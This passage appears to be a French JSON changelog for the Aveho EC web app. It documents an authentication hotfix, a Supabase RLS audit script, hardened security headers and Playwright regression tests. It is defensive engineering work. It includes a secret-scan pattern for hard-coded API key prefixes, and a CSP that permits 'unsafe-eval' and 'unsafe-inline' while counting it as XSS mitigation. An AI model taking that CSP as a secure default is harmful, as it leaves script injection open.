          "before": "// 0.57.16 LINT cherchait : await fetch(\"/api/...\") en littéral\n// → MAIS FinessSearch.js fait :\nlet url;\nif (isFinessNumber) {\n  url = `/api/finess?finess=${val}`;     // <- url assignée\n} else {\n  url = `/api/finess?${params}`;\n}\nconst res = await fetch(url);             // <- fetch(url) — pas en littéral !\n// → LINT 0.57.16 ne détecte rien → bug passe en prod",
          "after": "// 0.57.18 - fix + LINT amélioré (v2)\nimport { fetchWithAuth } from \"../lib/fetchWithAuth\";  // 0.57.18\n\nlet url;\nif (isFinessNumber) {\n  url = `/api/finess?finess=${val}`;\n} else {\n  url = `/api/finess?${params}`;\n}\nconst res = await fetchWithAuth(url);     // 0.57.18 : auth Bearer obligatoire\n\n// + LINT v2 dans __tests__/v057-16-hotfix-fetchwithauth.test.js :\n//   - PATTERN 1 : await fetch(\"/api/...\") en littéral (déjà couvert)\n//   - PATTERN 2 : await fetch(url) + url = \"/api/...\" assignée ailleurs\n//     → détecte FinessSearch + tout futur composant avec ce pattern"
        }
      },
      { "code": "FE", "txt": "LINT anti-régression v2 dans __tests__/v057-16-hotfix-fetchwithauth.test.js : ajout du PATTERN 2 qui détecte 'await fetch(url)' couplé à 'url = \"/api/...\"' ailleurs dans le fichier. Test parcourt récursivement app/, parse chaque .js, et matche maintenant LES DEUX patterns (literal ET variable). Garantit que tout futur composant avec ce style sera attrapé avant le push. Validé : le LINT v2 aurait détecté FinessSearch.js cassé si on n'avait pas fixé en parallèle" },
      { "code": "DB", "txt": "Script SQL audit RLS Supabase livré (scripts/audit-rls-supabase.sql) : suite à l'alerte Supabase Security Advisor signalant (1) une table publique sans RLS, (2) une view exposant auth.users. Le script est en 6 parties — toutes en READ-ONLY pour la PARTIE 1 (audit) et COMMENTÉES pour la PARTIE 2 (fix) afin d'éviter toute exécution accidentelle",
        "code_snippet": {
          "file": "scripts/audit-rls-supabase.sql",
          "note": "Aperçu du script audit",
          "lang": "sql",
          "before": "-- Avant 0.57.18 : pas d'audit RLS automatisé\n-- → l'utilisateur a découvert le problème via mail Supabase\n--   'Table publicly accessible' (rls_disabled_in_public)\n--   'User data exposed through a view' (auth_users_exposed)",
          "after": "-- PARTIE 1 (lecture seule) : audit\n-- 1.1 Tables sans RLS (= publiquement accessibles)\nSELECT tablename, '🚨 RLS DÉSACTIVÉ' AS warning\nFROM pg_tables\nWHERE schemaname = 'public' AND rowsecurity = false;\n\n-- 1.2 Tables avec RLS mais 0 policy (= cassées)\nSELECT t.tablename, '⚠️ RLS activé mais 0 policy' AS warning\nFROM pg_tables t\nLEFT JOIN pg_policies p ON p.tablename = t.tablename\nWHERE t.schemaname = 'public' AND t.rowsecurity = true\nGROUP BY t.tablename HAVING COUNT(p.policyname) = 0;\n\n-- 1.3 Views exposant auth.users\nSELECT viewname, '🚨 VIEW EXPOSE AUTH.USERS' AS warning\nFROM pg_views\nWHERE schemaname = 'public' AND definition ILIKE '%auth.users%';\n\n-- 1.4 Fonctions SECURITY DEFINER (potentielle escalade)\nSELECT proname, '⚠️ Vérifier search_path' AS warning\nFROM pg_proc p JOIN pg_namespace n ON p.pronamespace = n.oid\nWHERE n.nspname = 'public' AND p.prosecdef = true;\n\n-- PARTIE 2 (commentée) : fix templates prêts à customiser\n-- 2.1 ALTER TABLE ... ENABLE ROW LEVEL SECURITY (batch)\n-- 2.2 Policy 'lecture authenticated' (refs)\n-- 2.3 Policy 'isolation structure_id' (table métier)\n-- 2.4 Recréer view sans auth.users (security_invoker=true)\n-- 2.5 Figer search_path SECURITY DEFINER"
        }
      },
      { "code": "DOC", "txt": "Pour l'utilisateur : lancer le script audit-rls-supabase.sql depuis Supabase Dashboard → SQL Editor. Les 6 requêtes de la PARTIE 1 retournent les tables/views/fonctions à fixer. Ensuite, dans la PARTIE 2 (commentée), décommenter et adapter UN BLOC À LA FOIS selon ce qui ressort : (a) si une table métier sans RLS → utiliser le template 2.3 'isolation par structure', (b) si une table référentiel sans RLS → template 2.2 'lecture authenticated', (c) si une view expose auth.users → template 2.4 'recréer avec security_invoker=true', (d) si fonction SECURITY DEFINER sans search_path → template 2.5. Toujours faire un SNAPSHOT Supabase avant la PARTIE 2" },
      { "code": "AI", "txt": "+24 tests Vitest (v057-18-hotfix-finess-rls.test.js) : version (1), hotfix FinessSearch (4 — import fetchWithAuth + utilise fetchWithAuth(url) + plus aucun fetch(url) direct + marqueur 0.57.18), LINT amélioré (3 — PATTERN 1 + PATTERN 2 + détection url variable), script SQL RLS (8 — fichier existe + 6 audits + fix templates + recommandation snapshot), anti-régression (1 test indirect que LINT v2 fonctionne). Total 2752 tests verts (vs 2734)" }
    ],
    "themes": ["hotfix", "securite", "rls"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.18.html",
    "sqlFile": null
  },
  {
    "v": "0.57.17",
    "kind": "version",
    "titre": "🛡️ Durcissement sécurité approfondi : CSP report-only, HSTS preload 1 an, Permissions-Policy 27 directives, COEP/CORP, auth standardisée from-ocr, +31 tests sécurité",
    "chantiers": [
      { "code": "FE", "txt": "Content-Security-Policy (CSP) ajouté en mode REPORT-ONLY (10 directives) : default-src 'self' (deny by default), script-src + connect-src + img-src configurés finement (Supabase wss + api.gouv.fr + tile.openstreetmap.org + maps.googleapis.com + recherche-entreprises.api.gouv.fr), frame-src 'none' (zéro iframe externe), object-src 'none' (pas de Flash/Java), form-action 'self' (anti-CSRF forms), frame-ancestors 'self' (anti-clickjacking via header moderne), upgrade-insecure-requests (force HTTPS sous-resources). Mode REPORT-ONLY pour ne pas casser le site, à basculer en enforcing après quelques jours d'observation en prod",
        "code_snippet": {
          "file": "next.config.js",
          "note": "CSP directives complètes (extrait)",
          "lang": "js",
          "before": "// 0.57.4 — pas de CSP\nconst SECURITY_HEADERS = [\n  { key: \"X-Content-Type-Options\", value: \"nosniff\" },\n  { key: \"X-Frame-Options\", value: \"SAMEORIGIN\" },\n  { key: \"Strict-Transport-Security\", value: \"max-age=15552000; includeSubDomains\" },\n  { key: \"Permissions-Policy\", value: \"camera=(self), microphone=(), geolocation=(self), payment=()\" },\n  // ... 6 headers au total\n];",
          "after": "// 0.57.17 — CSP + HSTS preload + Permissions étendue\nconst CSP_DIRECTIVES = [\n  \"default-src 'self'\",\n  \"script-src 'self' 'unsafe-eval' 'unsafe-inline' https://api.gouv.fr https://*.googleapis.com\",\n  \"style-src 'self' 'unsafe-inline'\",\n  \"font-src 'self' data:\",\n  \"img-src 'self' data: blob: https://*.tile.openstreetmap.org\",\n  \"connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.gouv.fr ...\",\n  \"worker-src 'self' blob:\",\n  \"frame-src 'none'\",\n  \"object-src 'none'\",\n  \"form-action 'self'\",\n  \"frame-ancestors 'self'\",\n  \"upgrade-insecure-requests\"\n];\n\nconst SECURITY_HEADERS = [\n  // ... headers OWASP existants\n  { key: \"Strict-Transport-Security\", value: \"max-age=31536000; includeSubDomains; preload\" },  // 1 an + preload\n  { key: \"Cross-Origin-Resource-Policy\", value: \"same-origin\" },  // NEW : anti-Spectre\n  { key: \"Content-Security-Policy-Report-Only\", value: CSP_DIRECTIVES.join(\"; \") },  // NEW\n  { key: \"X-Aveho-Security-Audit\", value: \"0.57.17\" },\n];\n\nmodule.exports = {\n  // ...\n  poweredByHeader: false,  // NEW : anti-fingerprinting\n};"
        }
      },
      { "code": "FE", "txt": "HSTS renforcé : max-age 6 mois (15552000s) → 1 an (31536000s) + ajout du flag 'preload' qui permet de soumettre aveho-ec-app.vercel.app au site hstspreload.org de Google. Une fois listé, TOUS les browsers (Chrome, Firefox, Safari, Edge) forceront HTTPS dès la 1ère visite sans avoir besoin du header — protège contre les MITM même au tout premier appel" },
      { "code": "FE", "txt": "Permissions-Policy étendue de 4 directives à 27 : ajout de bloquages explicites pour toutes les APIs sensibles (interest-cohort=() pour bloquer FLoC tracking Google, ambient-light-sensor, battery, bluetooth, display-capture, document-domain, encrypted-media, gamepad, gyroscope, hid, idle-detection, magnetometer, midi, navigation-override, screen-wake-lock, serial, speaker-selection, usb, xr-spatial-tracking, etc.) + autorisations ciblées (camera/geolocation/web-share/publickey-credentials-get sur 'self' uniquement pour OCR, carte, partage PWA, biométrie WebAuthn). Aucune surface d'attaque non nécessaire" },
      { "code": "FE", "txt": "Cross-Origin-Resource-Policy: same-origin ajouté pour mitiger Spectre/Meltdown (les attaques side-channel CPU qui pouvaient lire des données cross-origin). Exception : /tabler-icons/* en cross-origin car ce sont des ressources statiques publiques sans donnée sensible. Cache-Control public max-age=1 an + immutable sur les fonts Tabler pour optimiser le perf en plus" },
      { "code": "FE", "txt": "poweredByHeader: false dans next.config.js — désactive le header 'X-Powered-By: Next.js' qui permettait à un attaquant de fingerprinter le framework (et donc cibler des CVE spécifiques). Mesure anti-reconnaissance simple mais efficace" },
      { "code": "FIX", "txt": "Auth standardisée pour les 2 routes /from-ocr (patients/from-ocr + prescriptions/from-ocr) : avant elles faisaient leur propre vérification Bearer token avec createClient inline + supabase.auth.getUser() (~15 lignes de boilerplate dupliqué). Maintenant elles passent par requireAuth() du lib/apiAuth.js comme les 15 autres routes API. Code 50% plus court, comportement strictement identique, gain en maintenabilité (un fix dans requireAuth bénéficie automatiquement à toutes les routes)" },
      { "code": "FE", "txt": "Couverture requireAuth élargie : 15/19 routes (avant 0.57.17) → 17/19 routes (après). Les 2 routes restantes (/api/version et /api/health) sont des health-checks publics par design (consultés par les sondes Vercel et les monitoring externes). Le test 0.57.17 anti-régression vérifie que la whitelist contient EXACTEMENT ces 2 routes — si un dev ajoute /api/dump-all-patients sans requireAuth, le test échoue" },
      { "code": "AI", "txt": "Score sécurité headers : 10/10 mesuré en local après build (script test-headers.mjs) : X-Content-Type-Options nosniff ✓, X-Frame-Options SAMEORIGIN ✓, HSTS 1 an + preload ✓, Referrer-Policy strict-origin-when-cross-origin ✓, Permissions-Policy 27 directives ✓, COOP same-origin-allow-popups ✓, CORP same-origin ✓, CSP report-only 12 directives ✓, X-Aveho-Security-Audit 0.57.17 ✓, X-Powered-By ABSENT ✓. /tabler-icons : Cache-Control immutable + CORP cross-origin (assets publics)" },
      { "code": "AI", "txt": "+31 tests Vitest (v057-17-security-hardening.test.js) : version (1), 14 headers de sécurité durcis dans next.config.js (14), 9 CSP directives spécifiques (9), cache + CORP tabler-icons (2), auth standardisée from-ocr (3 : import requireAuth + authCheck pattern + plus de createClient inline), couverture requireAuth (2 : 17 routes protégées + seules /version+/health non protégées), LINT ANTI-RÉGRESSION (1 test critique : toute nouvelle route POST/PUT/DELETE hors whitelist doit avoir requireAuth). +2 tests anciens 0.56.3 et 0.57.4 ajustés pour le nouveau pattern requireAuth. Total 2734 tests verts (vs 2703)" },
      { "code": "DOC", "txt": "CSP en mode REPORT-ONLY : pour basculer en enforcing (Content-Security-Policy header au lieu de Content-Security-Policy-Report-Only), il faut d'abord observer les rapports d'erreur en prod (browsers envoient des reports sur ce qui aurait été bloqué). Quand on est sûr que rien de légitime ne casse, on bascule. Action : (1) déployer 0.57.17 en prod, (2) attendre 3-5 jours en surveillant la console DevTools, (3) si 0 erreur CSP : basculer dans 0.57.18 en remplaçant 'Content-Security-Policy-Report-Only' par 'Content-Security-Policy'" },
      { "code": "AI", "txt": "Audit sécurité actuel du soft Aveho EC : ✅ npm audit : 0 CRIT + 0 HIGH + 2 MOD postcss (build-time only, non exploitable). ✅ 17/19 routes API protégées (auth + rate limit). ✅ 10 headers HTTP sécurité (vs 6 en 0.57.4). ✅ CSP report-only configurée (mitigation XSS). ✅ HSTS 1 an + preload (force HTTPS). ✅ Permissions-Policy 27 directives. ✅ poweredByHeader désactivé. ✅ 0 secret en dur dans le code (audit grep AIzaSy/sk_live/service_role). ✅ 9 dangerouslySetInnerHTML audités SAFE (escape avant + sources statiques générées). ✅ 0 eval/new Function. ✅ Tests anti-régression actifs : ne pas oublier requireAuth + ne pas oublier fetchWithAuth + LINT POST/PUT/DELETE. ✅ lib/logger.js redacte les valeurs sensibles (password/token/credential_id)" }
    ],
    "themes": ["securite", "csp", "headers"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.17.html",
    "sqlFile": null
  },
  {
    "v": "0.57.16",
    "kind": "version",
    "titre": "🚨 HOTFIX critique : 7 fichiers utilisaient fetch() au lieu de fetchWithAuth() → SIRET, RPPS, OCR, prescriptions cassés en prod depuis 0.56.21",
    "chantiers": [
      { "code": "FIX", "txt": "BUG SIGNALÉ PAR L'UTILISATEUR : 'api siret ne fonctionne plus'. Diagnostic : depuis 0.56.21 qui a protégé toutes les routes API avec requireAuth (Bearer token Supabase obligatoire), 7 fichiers caller utilisaient encore fetch() direct au lieu de fetchWithAuth() → toutes ces fonctionnalités renvoyaient 401 'Non authentifié (Bearer token manquant)' en prod. Le bug est resté caché plusieurs jours car ces routes étaient peu testées en E2E (les smoke tests internes utilisent volontairement fetch sans auth pour vérifier le refus 401, donc passaient verts à tort)",
        "code_snippet": {
          "file": "app/SireneSearch.js",
          "note": "Le fix type — répété sur 7 fichiers",
          "lang": "js",
          "before": "// AVANT 0.57.16 - fetch direct sans token\nimport { useState, useEffect, useRef } from \"react\";\n// ...\nconst res = await fetch(url);  // → 401 Unauthorized en prod depuis 0.56.21\nconst data = await res.json();",
          "after": "// 0.57.16 - utilise fetchWithAuth qui ajoute Authorization: Bearer\nimport { useState, useEffect, useRef } from \"react\";\nimport { fetchWithAuth } from \"../lib/fetchWithAuth\";  // 0.57.16 : auth Bearer obligatoire\n// ...\nconst res = await fetchWithAuth(url);  // 0.57.16\nconst data = await res.json();"
        }
      },
      { "code": "FIX", "txt": "7 fichiers fixés : (1) app/SireneSearch.js — recherche entreprises par nom/SIRET/SIREN, utilisé dans les onboarding partenaires + fiche établissement. (2) app/RppsAutocomplete.js — /api/place (le /api/rpps était déjà OK), utilisé pour autocompléter les adresses des praticiens. (3) app/admin/prescriptions-archive/page.js — /api/prescriptions/search et /api/prescriptions/export-csv, page d'archive utilisée par les admins pour rechercher d'anciennes prescriptions. (4) app/admin/avis-google/page.js — /api/google-reviews/sync, page de gestion des avis Google. (5) app/scan/bulletin-situation/page.js — /api/ocr/bulletin-situation et /api/patients/from-ocr, scanner de bulletins de situation CPAM. (6) app/scan/prescription/page.js — /api/ocr/prescription et /api/prescriptions/from-ocr, scanner de prescriptions. (7) app/scan/ocr/page.js — /api/ocr/generic, scanner OCR générique" },
      { "code": "AI", "txt": "Script Python automatisé pour le fix : (a) parse chaque fichier cassé, (b) ajoute l'import 'import { fetchWithAuth } from \"...../lib/fetchWithAuth\"' après le dernier import existant si absent, (c) remplace tous les patterns 'await fetch(\"<route>\")' et 'await fetch(`<route>`)' par 'await fetchWithAuth(...)' pour les routes spécifiques de chaque fichier. Évite les remplacements globaux qui auraient pu casser d'autres fetch() légitimes (ex: APIs externes, /api/version qui n'a pas requireAuth)" },
      { "code": "AI", "txt": "+19 tests Vitest (v057-16-hotfix-fetchwithauth.test.js) dont 1 test de NON-RÉGRESSION majeur : (1) Version 0.57.16+ (1 test). (2) Imports fetchWithAuth dans les 7 fichiers fixés (7 tests). (3) SireneSearch.js : fetchWithAuth utilisé + plus de fetch(url) direct (2 tests). (4) **LINT ANTI-RÉGRESSION** : parcourt récursivement app/ (hors app/api et hors changelog), parse chaque .js, détecte les await fetch(\"/api/...\") ou await fetch(`/api/...`) qui pointent vers une route protégée par requireAuth → fail si trouvé (1 test critique + 1 test sanity ≥ 10 routes protégées). (5) Documentation : 4 fichiers contiennent le marqueur 0.57.16 dans un commentaire explicatif (4 tests). Total 2703 tests verts (vs 2687)",
        "code_snippet": {
          "file": "__tests__/v057-16-hotfix-fetchwithauth.test.js",
          "note": "Test anti-régression critique",
          "lang": "js",
          "before": "// Avant 0.57.16 : aucun test ne détectait ce bug\n// Le bug 0.56.21 → 0.57.15 (4 jours) est resté en prod",
          "after": "// 0.57.16 - lint anti-régression\nfunction findDirectFetches() {\n  const bugs = [];\n  const protectedRoutes = getProtectedRoutes();  // routes avec requireAuth\n  walk(path.join(projectRoot, \"app\"));\n  // → cherche /await fetch([\"'`])\\/api\\// dans tous les .js (hors app/api, hors changelog)\n  // → matche contre les routes protégées\n  // → renvoie [{file, route}] si bug détecté\n  return bugs;\n}\n\nit(\"Aucun fetch() direct vers une route avec requireAuth\", () => {\n  const bugs = findDirectFetches();\n  expect(bugs).toEqual([]);  // ← FAIL automatique si quelqu'un ajoute un fetch oublié\n});"
        }
      },
      { "code": "DOC", "txt": "Marqueur '0.57.16' dans les commentaires d'import et de fetchWithAuth permet de tracer rapidement les changements (grep -rn '0.57.16' montre tous les endroits touchés). Pattern reproductible pour les hotfixes futurs : toujours mettre la version dans le commentaire du fix pour qu'un futur dev comprenne pourquoi le code est comme ça" },
      { "code": "FIX", "txt": "ACTION CRITIQUE POUR L'UTILISATEUR : déployer cette 0.57.16 le plus vite possible sur Vercel pour que les fonctionnalités SIRET, RPPS-place, OCR (bulletins/prescriptions), avis Google et archive prescriptions redeviennent fonctionnelles. C'est un blocker pour les utilisateurs Aveho qui ne peuvent plus utiliser ces 7 features depuis le déploiement 0.56.21" }
    ],
    "themes": ["hotfix", "securite", "auth"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.16.html",
    "sqlFile": null
  },
  {
    "v": "0.57.15",
    "kind": "version",
    "titre": "📸 Visual regression étendu : 18 baselines (vs 7) — viewports multiples, mode signup, sections, notes 4 versions",
    "chantiers": [
      { "code": "FE", "txt": "Extension de tests/e2e/visual-regression.spec.js avec 11 nouvelles baselines : (1) notes HTML 0.56.20 / 0.57.0 / 0.57.12 en plus de 0.55.0 (4 versions couvertes pour détecter régression dans le template des notes), (2) login en mode signup (toggle 'Créer un compte' qui affiche le bouton 'Créer mon compte' + lien 'Déjà un compte ?'), (3) section magic link sur /login, (4) /login en 4 viewports différents (Pixel 5 393×851, iPhone SE 375×667, iPad landscape 1024×768, Desktop large 1920×1080), (5) /mentions-legales en tablette, (6) sections /mentions-legales clipped (Éditeur top 1100 px + footer après scroll). Total : 18 baselines, 4 MB",
        "code_snippet": {
          "file": "tests/e2e/visual-regression.spec.js",
          "note": "Nouveau test viewport multiple",
          "lang": "js",
          "before": "// 0.57.14 — 1 seul viewport mobile (Pixel 5)\ntest.describe(\"Visual regression — Mobile viewport\", () => {\n  test.use({ viewport: { width: 393, height: 851 } });\n  test(\"/login mobile (Pixel 5)\", async ({ page }) => {\n    await page.goto(\"/login\");\n    // ...\n  });\n});",
          "after": "// 0.57.15 — 4 viewports nested describes\ntest.describe(\"Visual regression — Viewports multiples\", () => {\n  test.describe(\"Tablette iPad (1024×768)\", () => {\n    test.use({ viewport: { width: 1024, height: 768 } });\n    test(\"/login tablette landscape\", async ({ page }) => { ... });\n    test(\"/mentions-legales tablette landscape\", async ({ page }) => { ... });\n  });\n  test.describe(\"Mobile petit (iPhone SE 375×667)\", () => {\n    test.use({ viewport: { width: 375, height: 667 } });\n    test(\"/login iPhone SE\", async ({ page }) => { ... });\n  });\n  test.describe(\"Desktop large (1920×1080)\", () => {\n    test.use({ viewport: { width: 1920, height: 1080 } });\n    test(\"/login desktop large\", async ({ page }) => { ... });\n  });\n});"
        }
      },
      { "code": "FE", "txt": "Tests de mode signup : clique sur le lien 'Créer un compte' puis screenshot du formulaire dans son nouvel état (bouton vert 'Créer mon compte' au lieu de 'Se connecter', label 'Créez votre compte' au lieu de 'Connectez-vous à votre Espace Aveho', lien 'Déjà un compte ? Se connecter' au lieu de 'Pas encore de compte ?'). Permet de détecter toute régression dans la logique de toggle mode signin/signup" },
      { "code": "FE", "txt": "Tests sections mentions légales : clip de la zone Éditeur (top 1100 px stable) + screenshot du viewport après scroll to bottom (window.scrollTo(0, document.body.scrollHeight) + wait 300ms) pour capturer le footer + contact. Couvre les 5 sections de la page (Éditeur, Protection des données, Cookies, Conditions, Contact) sans la flakiness d'un fullPage sur une page longue" },
      { "code": "FE", "txt": "Tests viewports multiples via test.describe imbriqués : chaque viewport a son propre describe avec test.use({ viewport }). Pattern reproductible pour ajouter facilement d'autres tailles si besoin (Galaxy S20, iPad Pro, écran 4K). Aveho ciblant des PSAD qui utilisent surtout PC fixes, tablettes (techniciens sur le terrain) et smartphones (administratif), couvrir ces 4 tailles est représentatif" },
      { "code": "FE", "txt": "Tentative initiale /changelog header retirée : la page /changelog nécessite l'auth, donc en mode SMOKE (sans Supabase) elle redirige vers /login. Le screenshot capturait /login → doublon avec login-page.png. Remplacé par 2 baselines plus utiles : mentions-section-editeur (clip 1100 px) et mentions-section-footer (après scroll). À l'avenir, si on configure E2E_MODE=FULL avec Supabase de test, on pourra rajouter /changelog avec auth" },
      { "code": "AI", "txt": "Résultats mesurés (2 runs consécutifs) : 18/18 baselines stables. Tailles : login-desktop-large 357 KB (1920×1080 le plus lourd), changelog/sections 197-272 KB, note headers 196-247 KB, login-iphone-se 160 KB (le plus léger). Génération + validation total : ~33s pour 18 tests Chromium. 0 faux positif, 0 flakiness sur cette suite" },
      { "code": "AI", "txt": "+25 tests Vitest (v057-15-visual-regression-extended.test.js) : version (1), 18 baselines totales + chaque nouvelle baseline existe avec taille > 50 KB (12), couverture notes 4 versions (4), tests login states (2 — signup + magic link), 4 viewports (4 — tablette 1024×768, iPhone SE 375×667, desktop large 1920×1080, mobile Pixel 5 393×851), sections mentions légales (2 — Éditeur clipped + footer scroll). Total 2687 tests verts (vs 2662)" }
    ],
    "themes": ["tests", "e2e", "visual-regression", "playwright"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.15.html",
    "sqlFile": null
  },
  {
    "v": "0.57.14",
    "kind": "version",
    "titre": "📸 Visual regression testing : toHaveScreenshot Playwright sur 7 baselines (desktop + mobile + composants)",
    "chantiers": [
      { "code": "FE", "txt": "Création de tests/e2e/visual-regression.spec.js : 7 tests de régression visuelle qui comparent les screenshots actuels aux baselines de référence stockées dans tests/e2e/__screenshots__/. Couvre : (1) /login full page, (2) /mentions-legales full page, (3) login card vide (xpath ancestor des inputs car pas de <form>), (4) login card avec valeurs (email + password remplis), (5) /login mobile Pixel 5 (393×851), (6) /mentions-legales mobile, (7) header note HTML 0.55.0 (clip 1280×800). Permet de détecter automatiquement les régressions UI : changement de couleur, padding qui dérive, alignement cassé, font qui ne charge pas, etc.",
        "code_snippet": {
          "file": "tests/e2e/visual-regression.spec.js",
          "note": "Exemple de test visual regression",
          "lang": "js",
          "before": "// Avant 0.57.14 — pas de visual regression\n// Les changements UI subtils (couleur off, padding 8→10px, etc.)\n// passaient inaperçus jusqu'à ce qu'un utilisateur signale",
          "after": "// 0.57.14 — Détection automatique\ntest(\"/login matches baseline\", async ({ page }) => {\n  await page.goto(\"/login\");\n  await page.waitForLoadState(\"networkidle\");\n  await prepareForScreenshot(page);  // disable animations + wait fonts\n  await expect(page).toHaveScreenshot(\"login-page.png\", {\n    fullPage: true,\n    maxDiffPixels: 100,\n  });\n});\n\n// Génération baselines : npm run test:visual:update\n// Validation à chaque commit : npm run test:visual"
        }
      },
      { "code": "FE", "txt": "Helper setupPopupsSkip(context) : utilise context.addInitScript() pour pré-remplir le localStorage AVANT que le JS de la page ne s'exécute. Configure aveho_geoloc_choice=declined, aveho_biometric_optin_shown=1, aveho_install_banner_dismissed=1. Sans ce helper, le popup 'Activer la géolocalisation' s'affichait au 1er load et bloquait tout le viewport screenshot (rendant le test inutile). Appelé dans beforeEach() de chaque describe via la fixture context Playwright" },
      { "code": "FE", "txt": "Helper prepareForScreenshot(page) : (1) injecte un <style> qui force animation-duration et transition-duration à 0s sur tous les éléments (évite la flakiness des animations en cours), (2) masque les badges de version qui changent à chaque bump ([class*='version' i], [data-version]), (3) attend document.fonts.ready pour s'assurer que Quicksand + Tabler Icons sont chargées (sans ça, le layout peut shifter quand la font remplace la fallback), (4) waitForTimeout(300) pour stabilisation finale. Le helper est appelé juste avant chaque toHaveScreenshot" },
      { "code": "FE", "txt": "Configuration playwright.config.js : ajout du bloc 'expect.toHaveScreenshot' avec maxDiffPixelRatio=0.002 (0.2% de différence pixel tolérée par défaut), animations='disabled' (Playwright désactive aussi de son côté en plus de notre injection CSS), caret='hide' (cache le curseur clignotant des inputs). Ajout de snapshotPathTemplate='{testDir}/__screenshots__/{testFileName}/{arg}{ext}' pour standardiser le path des baselines" },
      { "code": "FE", "txt": "Scripts npm 'test:visual' (validation : playwright test tests/e2e/visual-regression.spec.js) et 'test:visual:update' (regen des baselines après changement UI volontaire : ajoute --update-snapshots). Workflow recommandé : (1) la 1ère fois, lancer test:visual:update pour générer les baselines, (2) versionner tests/e2e/__screenshots__/ dans git, (3) à chaque commit, lancer test:visual pour comparer, (4) si fail intentionnel après refonte UI, relancer test:visual:update et commit les nouvelles baselines" },
      { "code": "FE", "txt": "Adaptation des sélecteurs : Aveho n'utilise pas de balise HTML <form> (le login est un div React avec onClick sur le bouton), donc impossible de faire page.locator('form'). Solution : utiliser un xpath ancestor depuis l'input email — page.locator(\"input[type='email']\").locator(\"xpath=ancestor::div[2]\") cible le 2ème div parent qui correspond à la card login. Permet de screenshoter juste le composant pertinent sans bruit autour" },
      { "code": "FE", "txt": "Clip pour les pages longues : la note HTML 0.55.0 fait ~5800 px de hauteur, ce qui produit une variance de ~18 px entre 2 runs à cause du font-rendering subpixel. Au lieu de screenshoter en fullPage (instable), on clip les 800 premiers pixels qui contiennent le header (logo + titre + meta) — ces 800 px sont stables. Pattern réutilisable pour toute page longue : 'clip: { x: 0, y: 0, width: 1280, height: 800 }'" },
      { "code": "DOC", "txt": "README.md tests/e2e étendu avec section 'Visual regression testing' au début : explique le workflow update vs validate, les particularités (Chromium-only, setupPopupsSkip, prepareForScreenshot, maxDiffPixels), et la liste des pages couvertes. Permet à l'équipe de comprendre comment maintenir les baselines lors de refonte UI volontaire vs régression accidentelle" },
      { "code": "AI", "txt": "Résultats mesurés (2 runs consécutifs en sandbox) : 7/7 baselines générées proprement (~2.5 MB total : login-page 213 KB desktop, mentions-legales 213 KB, login-card-empty 166 KB, login-card-filled 166 KB, login-mobile-pixel5 101 KB, mentions-legales-mobile 101 KB, note-version-0-55-0-header 350 KB). Validation par 2 runs successifs sans regen → 7/7 passed → stabilité confirmée. Le popup géoloc est bien masqué, le numéro de version est invisible, les fonts sont stabilisées" },
      { "code": "AI", "txt": "+24 tests Vitest (v057-14-visual-regression.test.js) : version + scripts (3 — test:visual, test:visual:update, version 0.57.14+), spec visual-regression (8 — fichier existe, setupPopupsSkip + addInitScript + localStorage keys, prepareForScreenshot animations + fonts, skip non-chromium, toHaveScreenshot count, viewport Pixel 5, maxDiffPixels), config Playwright (4 — toHaveScreenshot dans expect, maxDiffPixelRatio, animations disabled, snapshotPathTemplate __screenshots__), baselines (9 — dossier existe, ≥ 5 PNG, 7 noms attendus avec taille > 10 KB). Total 2662 tests verts (vs 2638)" }
    ],
    "themes": ["tests", "e2e", "visual-regression", "playwright"],
    "date": "2 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.14.html",
    "sqlFile": null
  },
  {
    "v": "0.57.13",
    "kind": "version",
    "titre": "🦊 Tests E2E cross-browser : Chromium + Firefox + WebKit + mobile (Pixel 5, iPhone 13)",
    "chantiers": [
      { "code": "FE", "txt": "Extension de Playwright à 5 environnements : Chromium (Desktop Chrome), Firefox (Desktop Firefox), WebKit (Desktop Safari) et mobile (Pixel 5 viewport 393×851, iPhone 13 viewport 390×844). Téléchargement des 3 browsers via 'npx playwright install chromium firefox webkit' (~300 MB total). Important pour Aveho car les utilisateurs accèdent depuis tous les navigateurs et notamment Safari iOS qui a des comportements spécifiques (WebAuthn, font-display, CSS :has(), ResizeObserver)",
        "code_snippet": {
          "file": "playwright.config.js",
          "note": "Avant/après cross-browser",
          "lang": "js",
          "before": "// 0.57.12 - mono-browser\nprojects: [\n  {\n    name: \"chromium\",\n    use: { browserName: \"chromium\" },\n  },\n],",
          "after": "// 0.57.13 - cross-browser + mobile + filtre BROWSERS env\nimport { defineConfig, devices } from \"@playwright/test\";\n\nconst BROWSERS = (process.env.BROWSERS || \"chromium,firefox,webkit\").split(\",\");\n\nconst allProjects = [\n  { name: \"chromium\", use: { ...devices[\"Desktop Chrome\"] } },\n  { name: \"firefox\", use: { ...devices[\"Desktop Firefox\"] } },\n  { name: \"webkit\", use: { ...devices[\"Desktop Safari\"] } },\n  { name: \"Mobile Chrome\", use: { ...devices[\"Pixel 5\"] } },\n  { name: \"Mobile Safari\", use: { ...devices[\"iPhone 13\"] } },\n];\n\n// Filtre par env : BROWSERS=chromium pour CI rapide\nprojects: allProjects.filter(p =>\n  BROWSERS.includes(p.name) ||\n  BROWSERS.some(b => p.name.toLowerCase().includes(b.toLowerCase()))\n)"
        }
      },
      { "code": "FE", "txt": "Adaptation login.spec.js pour la biométrie cross-browser : le test 'affiche les boutons biométrie (Empreinte + Visage)' utilise désormais la fixture browserName pour tolérer WebKit headless qui ne supporte pas WebAuthn (donc 0 boutons biométrie en WebKit headless = OK, mais 2 boutons attendus strictement sur Chromium et Firefox). Évite les faux positifs en CI cross-browser" },
      { "code": "FE", "txt": "Adaptation smoke-all-pages.spec.js pour le quirk Firefox NS_BINDING_ABORTED : Firefox peut interrompre une navigation si une précédente n'est pas finie. On catche l'erreur spécifique (message NS_BINDING_ABORTED + browserName === 'firefox') et on retente une fois après 500ms. Comportement transparent pour le développeur, les tests passent fiablement sur Firefox" },
